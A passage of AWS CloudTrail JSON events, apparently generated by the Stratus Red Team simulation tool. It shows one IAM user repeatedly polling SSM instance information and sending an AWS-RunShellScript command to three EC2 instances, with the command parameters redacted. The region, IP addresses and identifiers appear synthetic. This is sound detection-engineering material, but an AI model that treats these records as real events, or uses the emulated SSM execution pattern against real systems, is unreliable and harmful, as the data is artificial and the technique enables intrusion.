\"0d86f878-d8c0-475c-8079-2a1243666e45\",\n      \"eventName\": \"DescribeInstanceInformation\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-02T09:07:58Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"056392974792\",\n      \"requestID\": \"914d4883-5725-4059-bf32-8b240cd2be40\",\n      \"requestParameters\": {\n         \"filters\": [\n            {\n               \"key\": \"InstanceIds\",\n               \"values\": [\n                  \"i-00456A8D163f546Ff\",\n                  \"i-cfE23b1a7ceba6f86\",\n                  \"i-9D40CCFc0aE91CFa5\"\n               ]\n            }\n         ]\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"253.252.51.07\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.sagov-westsouth-1r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_ea782787-a65d-4fc4-9fca-1c97869a9a25\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAW9X2Q2U25SK79UCX\",\n         \"accountId\": \"056392974792\",\n         \"arn\": \"arn:aws:iam::056392974792:user/christophe\",\n         \"principalId\": \"AIDA10CZIPPG73T21TDI\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"sagov-westsouth-1r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"bab0e5ba-5a43-467d-9460-dd801d9e9ad8\",\n      \"eventName\": \"GetCommandInvocation\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-02T09:09:02Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"056392974792\",\n      \"requestID\": \"55198b26-f77b-4ef8-9259-bb347696f512\",\n      \"requestParameters\": {\n         \"commandId\": \"4e973221-443e-4a56-a0b4-1cb3c7923fc3\",\n         \"instanceId\": \"i-9D40CCFc0aE91CFa5\"\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"253.252.51.07\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.sagov-westsouth-1r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_ea782787-a65d-4fc4-9fca-1c97869a9a25\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAW9X2Q2U25SK79UCX\",\n         \"accountId\": \"056392974792\",\n         \"arn\": \"arn:aws:iam::056392974792:user/christophe\",\n         \"principalId\": \"AIDA10CZIPPG73T21TDI\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"sagov-westsouth-1r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"b2c7717c-e542-422f-a78d-590536c174cb\",\n      \"eventName\": \"GetCommandInvocation\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-02T09:09:01Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"056392974792\",\n      \"requestID\": \"3a1aa185-9cc4-4d58-933c-c2a6ad37c730\",\n      \"requestParameters\": {\n         \"commandId\": \"4e973221-443e-4a56-a0b4-1cb3c7923fc3\",\n         \"instanceId\": \"i-00456A8D163f546Ff\"\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"253.252.51.07\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.sagov-westsouth-1r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_ea782787-a65d-4fc4-9fca-1c97869a9a25\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAW9X2Q2U25SK79UCX\",\n         \"accountId\": \"056392974792\",\n         \"arn\": \"arn:aws:iam::056392974792:user/christophe\",\n         \"principalId\": \"AIDA10CZIPPG73T21TDI\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"sagov-westsouth-1r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"e0b17230-9c13-482a-a0f0-d93c6bd4fb8e\",\n      \"eventName\": \"GetCommandInvocation\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-02T09:09:01Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"056392974792\",\n      \"requestID\": \"dd526977-54b5-4951-bdb4-b9e542af402b\",\n      \"requestParameters\": {\n         \"commandId\": \"4e973221-443e-4a56-a0b4-1cb3c7923fc3\",\n         \"instanceId\": \"i-cfE23b1a7ceba6f86\"\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"253.252.51.07\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.sagov-westsouth-1r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_ea782787-a65d-4fc4-9fca-1c97869a9a25\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAW9X2Q2U25SK79UCX\",\n         \"accountId\": \"056392974792\",\n         \"arn\": \"arn:aws:iam::056392974792:user/christophe\",\n         \"principalId\": \"AIDA10CZIPPG73T21TDI\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"sagov-westsouth-1r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"5288bfb8-e3fa-4c41-be02-6853521afe8b\",\n      \"eventName\": \"SendCommand\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-02T09:08:56Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": false,\n      \"recipientAccountId\": \"056392974792\",\n      \"requestID\": \"1479b5e1-9751-4bf1-b548-cdd8108e85a6\",\n      \"requestParameters\": {\n         \"documentName\": \"AWS-RunShellScript\",\n         \"instanceIds\": [\n            \"i-00456A8D163f546Ff\",\n            \"i-cfE23b1a7ceba6f86\",\n            \"i-9D40CCFc0aE91CFa5\"\n         ],\n         \"interactive\": false,\n         \"parameters\": \"HIDDEN_DUE_TO_SECURITY_REASONS\"\n      },\n      \"responseElements\": {\n         \"command\": {\n            \"alarmConfiguration\": {\n               \"alarms\": [],\n               \"ignorePollAlarmFailure\": false\n            },\n            \"clientName\": \"\",\n            \"clientSourceId\": \"\",\n            \"cloudWatchOutputConfig\": {\n               \"cloudWatchLogGroupName\": \"\",\n               \"cloudWatchOutputEnabled\": false\n            },\n            \"commandId\": \"4e973221-443e-4a56-a0b4-1cb3c7923fc3\",\n            \"comment\": \"\",\n            \"completedCount\": 0,\n            \"deliveryTimedOutCount\": 0,\n            \"documentName\": \"AWS-RunShellScript\",\n            \"documentVersion\": \"$DEFAULT\",\n            \"errorCount\": 0,\n            \"expiresAfter\": \"Aug 2, 2024, 11:08:56 AM\",\n            \"hasCancelCommandSignature\": false,\n            \"hasSendCommandSignature\": false,\n            \"instanceIds\": [\n               \"i-00456A8D163f546Ff\",\n               \"i-cfE23b1a7ceba6f86\",\n               \"i-9D40CCFc0aE91CFa5\"\n            ],\n            \"interactive\": false,\n            \"maxConcurrency\": \"50\",\n            \"maxErrors\": \"0\",\n            \"notificationConfig\": {\n               \"notificationArn\": \"\",\n               \"notificationEvents\": [],\n               \"notificationType\": \"\"\n            },\n            \"outputS3BucketName\": \"\",\n            \"outputS3KeyPrefix\": \"\",\n            \"outputS3Region\": \"sagov-westsouth-1r\",\n            \"parameters\": \"HIDDEN_DUE_TO_SECURITY_REASONS\",\n            \"requestedDateTime\": \"Aug 2, 2024, 9:08:56 AM\",\n            \"serviceRole\": \"\",\n            \"status\": \"Pending\",\n            \"statusDetails\": \"Pending\",\n            \"targetCount\": 3,\n            \"targets\": [],\n            \"timeoutSeconds\": 3600,\n            \"triggeredAlarms\": []\n         }\n      },\n      \"sourceIPAddress\": \"253.252.51.07\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.sagov-westsouth-1r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_ea782787-a65d-4fc4-9fca-1c97869a9a25\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAW9X2Q2U25SK79UCX\",\n         \"accountId\": \"056392974792\",\n         \"arn\": \"arn:aws:iam::056392974792:user/christophe\",\n         \"principalId\": \"AIDA10CZIPPG73T21TDI\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"sagov-westsouth-1r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"8e1d1d98-6f88-4ce9-8e62-c1ec1a598408\",\n      \"eventName\": \"DescribeInstanceInformation\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-02T09:08:56Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"056392974792\",\n      \"requestID\": \"5e34f5e1-11f1-481f-a435-c6124bd640d2\",\n      \"requestParameters\": {\n         \"filters\": [\n            {\n               \"key\": \"InstanceIds\",\n               \"values\": [\n                  \"i-00456A8D163f546Ff\",\n                  \"i-cfE23b1a7ceba6f86\",\n                  \"i-9D40CCFc0aE91CFa5\"\n               ]\n            }\n         ]\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"253.252.51.07\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.sagov-westsouth-1r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_ea782787-a65d-4fc4-9fca-1c97869a9a25\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAW9X2Q2U25SK79UCX\",\n         \"accountId\": \"056392974792\",\n         \"arn\": \"arn:aws:iam::056392974792:user/christophe\",\n         \"principalId\": \"AIDA10CZIPPG73T21TDI\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"sagov-westsouth-1r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"e470e8f0-fbf0-42c1-a751-b271929bfa22\",\n      \"eventName\": \"GetCommandInvocation\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-02T09:08:56Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"056392974792\",\n      \"requestID\": \"c6b8d64a-b975-4306-a8ac-17671377c2af\",\n      \"requestParameters\": {\n         \"commandId\": \"4e973221-443e-4a56-a0b4-1cb3c7923fc3\",\n         \"instanceId\": \"i-00456A8D163f546Ff\"\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"253.252.51.07\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.sagov-westsouth-1r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_ea782787-a65d-4fc4-9fca-1c97869a9a25\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAW9X2Q2U25SK79UCX\",\n         \"accountId\": \"056392974792\",\n         \"arn\": \"arn:aws:iam::056392974792:user/christophe\",\n         \"principalId\": \"AIDA10CZIPPG73T21TDI\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"sagov-westsouth-1r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"ad342d3d-e850-41c3-b3a6-3e5cf0b382d3\",\n      \"eventName\": \"DescribeInstanceInformation\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-02T09:08:55Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"056392974792\",\n      \"requestID\": \"6fd7d6fe-4452-462c-bf9c-c93daec119d6\",\n      \"requestParameters\": {\n         \"filters\": [\n            {\n               \"key\": \"InstanceIds\",\n               \"values\": [\n                  \"i-00456A8D163f546Ff\",\n                  \"i-cfE23b1a7ceba6f86\",\n                  \"i-9D40CCFc0aE91CFa5\"\n               ]\n            }\n         ]\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"253.252.51.07\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.sagov-westsouth-1r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_ea782787-a65d-4fc4-9fca-1c97869a9a25\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAW9X2Q2U25SK79UCX\",\n         \"accountId\": \"056392974792\",\n         \"arn\": \"arn:aws:iam::056392974792:user/christophe\",\n         \"principalId\": \"AIDA10CZIPPG73T21TDI\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"sagov-westsouth-1r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"486ae737-1798-4c36-a90a-20d61f22d678\",\n      \"eventName\": \"DescribeInstanceInformation\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-02T09:08:53Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"056392974792\",\n      \"requestID\": \"4dd32dc2-26bc-4d9a-a469-56c65a55f45e\",\n      \"requestParameters\": {\n         \"filters\": [\n            {\n               \"key\": \"InstanceIds\",\n               \"values\": [\n                  \"i-00456A8D163f546Ff\",\n                  \"i-cfE23b1a7ceba6f86\",\n                  \"i-9D40CCFc0aE91CFa5\"\n               ]\n            }\n         ]\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"253.252.51.07\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.sagov-westsouth-1r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_ea782787-a65d-4fc4-9fca-1c97869a9a25\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAW9X2Q2U25SK79UCX\",\n         \"accountId\": \"056392974792\",\n         \"arn\": \"arn:aws:iam::056392974792:user/christophe\",\n         \"principalId\": \"AIDA10CZIPPG73T21TDI\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"sagov-westsouth-1r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"6643948a-9472-4f72-b1ff-8ddcfedca235\",\n      \"eventName\": \"DescribeInstanceInformation\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-02T09:08:52Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"056392974792\",\n      \"requestID\": \"0605e0fd-df0a-493a-a915-832b50c17164\",\n      \"requestParameters\": {\n         \"filters\": [\n            {\n               \"key\": \"InstanceIds\",\n               \"values\": [\n                  \"i-00456A8D163f546Ff\",\n                  \"i-cfE23b1a7ceba6f86\",\n                  \"i-9D40CCFc0aE91CFa5\"\n               ]\n            }\n         ]\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"253.252.51.07\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.sagov-westsouth-1r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_ea782787-a65d-4fc4-9fca-1c97869a9a25\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAW9X2Q2U25SK79UCX\",\n         \"accountId\": \"056392974792\",\n         \"arn\": \"arn:aws:iam::056392974792:user/christophe\",\n         \"principalId\": \"AIDA10CZIPPG73T21TDI\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"sagov-westsouth-1r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"cd49199d-ffdc-46bf-acae-e6c6d73e215a\",\n      \"eventName\": \"DescribeInstanceInformation\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-02T09:08:51Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"056392974792\",\n      \"requestID\": \"65bc968b-731a-4dd5-93aa-3bfebcf16f85\",\n      \"requestParameters\": {\n         \"filters\": [\n            {\n               \"key\": \"InstanceIds\",\n               \"values\": [\n                  \"i-00456A8D163f546Ff\",\n                  \"i-cfE23b1a7ceba6f86\",\n                  \"i-9D40CCFc0aE91CFa5\"\n               ]\n            }\n         ]\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"253.252.51.07\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.sagov-westsouth-1r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_ea782787-a65d-4fc4-9fca-1c97869a9a25\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAW9X2Q2U25SK79UCX\",\n         \"accountId\": \"056392974792\",\n         \"arn\": \"arn:aws:iam::056392974792:user/christophe\",\n         \"principalId\": \"AIDA10CZIPPG73T21TDI\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"sagov-westsouth-1r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"53407d54-9944-4317-a20f-d9a52c2a35ee\",\n      \"eventName\": \"DescribeInstanceInformation\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-02T09:08:50Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"056392974792\",\n      \"requestID\": \"80ee2eb6-d794-4ac3-b2fb-6b9b40936d61\",\n      \"requestParameters\": {\n         \"filters\": [\n            {\n               \"key\": \"InstanceIds\",\n               \"values\": [\n                  \"i-00456A8D163f546Ff\",\n                  \"i-cfE23b1a7ceba6f86\",\n                  \"i-9D40CCFc0aE91CFa5\"\n               ]\n            }\n         ]\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"253.252.51.07\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.sagov-westsouth-1r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_ea782787-a65d-4fc4-9fca-1c97869a9a25\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAW9X2Q2U25SK79UCX\",\n         \"accountId\": \"056392974792\",\n         \"arn\": \"arn:aws:iam::056392974792:user/christophe\",\n         \"principalId\": \"AIDA10CZIPPG73T21TDI\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"sagov-westsouth-1r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"6f1a2b4e-89a5-43f0-8ef4-6f3ecd9e04dc\",\n      \"eventName\": \"DescribeInstanceInformation\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-02T09:08:49Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"056392974792\",\n      \"requestID\": \"5a765f60-eddc-4efe-bb7f-57b018f5c76a\",\n      \"requestParameters\": {\n         \"filters\": [\n            {\n               \"key\": \"InstanceIds\",\n               \"values\": [\n                  \"i-00456A8D163f546Ff\",\n                  \"i-cfE23b1a7ceba6f86\",\n                  \"i-9D40CCFc0aE91CFa5\"\n               ]\n            }\n         ]\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"253.252.51.07\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.sagov-westsouth-1r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_ea782787-a65d-4fc4-9fca-1c97869a9a25\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAW9X2Q2U25SK79UCX\",\n         \"accountId\": \"056392974792\",\n         \"arn\": \"arn:aws:iam::056392974792:user/christophe\",\n         \"principalId\": \"AIDA10CZIPPG73T21TDI\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"sagov-westsouth-1r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"fdcf7d26-3ffb-4e35-8534-933b6ced55b5\",\n      \"eventName\": \"DescribeInstanceInformation\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-02T09:08:48Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"056392974792\",\n      \"requestID\": \"42651f04-5238-4f63-889b-bee7734d29e0\",\n      \"requestParameters\": {\n         \"filters\": [\n            {\n               \"key\": \"InstanceIds\",\n               \"values\": [\n                  \"i-00456A8D163f546Ff\",\n                  \"i-cfE23b1a7ceba6f86\",\n                  \"i-9D40CCFc0aE91CFa5\"\n               ]\n            }\n         ]\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"253.252.51.07\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.sagov-westsouth-1r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_ea782787-a65d-4fc4-9fca-1c97869a9a25\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAW9X2Q2U25SK79UCX\",\n         \"accountId\": \"056392974792\",\n         \"arn\": \"arn:aws:iam::056392974792:user/christophe\",\n         \"principalId\": \"AIDA10CZIPPG73T21TDI\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"sagov-westsouth-1r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"1a5374a3-1223-46dc-b3c4-a0336179f22b\",\n      \"eventName\": \"DescribeInstanceInformation\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-02T09:08:46Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"056392974792\",\n      \"requestID\": \"f12f2209-52ba-4064-8e48-45a70ed55437\",\n      \"requestParameters\": {\n         \"filters\": [\n            {\n               \"key\": \"InstanceIds\",\n               \"values\": [\n                  \"i-00456A8D163f546Ff\",\n                  \"i-cfE23b1a7ceba6f86\",\n                  \"i-9D40CCFc0aE91CFa5\"\n               ]\n            }\n         ]\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"253.252.51.07\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.sagov-westsouth-1r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_ea782787-a65d-4fc4-9fca-1c97869a9a25\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAW9X2Q2U25SK79UCX\",\n         \"accountId\": \"056392974792\",\n         \"arn\": \"arn:aws:iam::056392974792:user/christophe\",\n         \"principalId\": \"AIDA10CZIPPG73T21TDI\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"sagov-westsouth-1r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"1fc0903a-bdd5-4a31-a15e-84efb05530dd\",\n      \"eventName\": \"DescribeInstanceInformation\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-02T09:08:45Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"056392974792\",\n      \"requestID\": \"54a4713e-2480-4b3c-95de-ffa6f061f6db\",\n      \"requestParameters\": {\n         \"filters\": [\n            {\n               \"key\": \"InstanceIds\",\n               \"values\": [\n                  \"i-00456A8D163f546Ff\",\n                  \"i-cfE23b1a7ceba6f86\",\n                  \"i-9D40CCFc0aE91CFa5\"\n               ]\n            }\n         ]\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"253.252.51.07\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.sagov-westsouth-1r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_ea782787-a65d-4fc4-9fca-1c97869a9a25\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAW9X2Q2U25SK79UCX\",\n         \"accountId\": \"056392974792\",\n         \"arn\": \"arn:aws:iam::056392974792:user/christophe\",\n         \"principalId\": \"AIDA10CZIPPG73T21TDI\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"sagov-westsouth-1r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"b43fdb25-5caf-4203-b2f4-5fd4d40344b0\",\n      \"eventName\": \"DescribeInstanceInformation\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-02T09:08:44Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"056392974792\",\n      \"requestID\": \"c2342054-aa38-41f4-b1b9-702828726730\",\n      \"requestParameters\": {\n         \"filters\": [\n            {\n               \"key\": \"InstanceIds\",\n               \"values\": [\n                  \"i-00456A8D163f546Ff\",\n                  \"i-cfE23b1a7ceba6f86\",\n                  \"i-9D40CCFc0aE91CFa5\"\n               ]\n            }\n         ]\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"253.252.51.07\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.sagov-westsouth-1r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_ea782787-a65d-4fc4-9fca-1c97869a9a25\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAW9X2Q2U25SK79UCX\",\n         \"accountId\": \"056392974792\",\n         \"arn\": \"arn:aws:iam::056392974792:user/christophe\",\n         \"principalId\": \"AIDA10CZIPPG73T21TDI\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"sagov-westsouth-1r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"97a253c0-5e84-4d78-8412-a420695ba4dc\",\n      \"eventName\": \"DescribeInstanceInformation\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-02T09:08:43Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"056392974792\",\n      \"requestID\": \"398704b7-2c17-4cb2-8efb-f27ef8f775fe\",\n      \"requestParameters\": {\n         \"filters\": [\n            {\n               \"key\": \"InstanceIds\",\n               \"values\": [\n                  \"i-00456A8D163f546Ff\",\n                  